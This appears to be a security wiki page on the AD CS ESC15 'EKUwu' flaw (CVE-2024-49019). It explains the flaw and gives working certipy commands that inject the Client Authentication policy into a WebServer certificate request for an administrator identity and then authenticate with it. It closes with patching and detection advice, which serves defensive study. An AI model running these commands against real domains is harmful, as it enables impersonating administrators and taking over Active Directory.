---
title: AD CS ESC15 — EKUwu / V1 schema injection
slug: adcs-esc15-ekuwu
---

> **TL;DR:** Any AD CS template built on the V1 schema (e.g. WebServer) lets an enroller smuggle arbitrary Application Policies into the CSR — including Client Authentication — turning a "serves only TLS" template into a domain-user authentication cert. Tracked as CVE-2024-49019.

## What it is
Version 1 certificate templates have no defined `msPKI-RA-Application-Policies` attribute and the CA does not validate Application Policies sent inside the CSR's request attributes. TrustedSEC's "EKUwu" research showed that if an attacker adds the Client Authentication OID (`1.3.6.1.5.5.7.3.2`) as an Application Policy in the request, the issued certificate carries it — and Windows KDCs honour Application Policies the same way as Extended Key Usage for PKINIT.

## Preconditions / where it applies
- Authenticated domain user with Enroll rights on any V1-schema template that allows the requester to supply a subject (or otherwise issues to the caller)
- Default install candidates: `WebServer`, `Subordinate Certification Authority`, `Cross Certification Authority`, `Directory Email Replication` — anything where Schema Version = 1 in the template object
- CA not patched with the November 2024 update (KB5046612 family)

## Technique
1. Enumerate V1 templates the user can enrol in:

```bash
certipy find -u alice@corp -p Pass -dc-ip 10.0.0.10 -stdout \
  | grep -E 'Schema Version|Template Name|Enrollment Rights'
```

2. Request a cert from a V1 template, injecting Client Authentication via `-application-policies`, and set the desired UPN as the SAN (the V1 WebServer template typically allows enrollee-supplied subject for SAN):

```bash
certipy req -u alice@corp -p Pass -ca CORP-CA -template WebServer \
  -upn administrator@corp.local \
  -application-policies '1.3.6.1.5.5.7.3.2' -dc-ip 10.0.0.10
```

3. PKINIT-authenticate with the resulting PFX and obtain a TGT:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```

The CA logs an issued WebServer cert, but the PKINIT exchange treats it as a Client Authentication cert because the Application Policy extension is present.

## Detection and defence
- Apply the October/November 2024 cumulative update; post-patch, the CA strips request-supplied Application Policies on V1 templates
- Audit V1 templates: convert to V2/V3 where possible and remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from any client-auth-capable template
- Hunt 4886/4887 events where the issued cert's Application Policies include Client Auth but the template name is WebServer or another non-auth template
- Confirm `StrongCertificateBindingEnforcement = 2` so SID-based binding catches PKINIT impersonation

## References
- [TrustedSEC — EKUwu, not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) — original disclosure with PoC
- [MSRC — CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) — vendor advisory and patch info
- [Certipy ESC15 docs](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15) — tool reference
- See also: [[adcs-attacks]], [[adcs-esc14-altsecidentities]], [[adcs-esc16-securityext-disabled]]
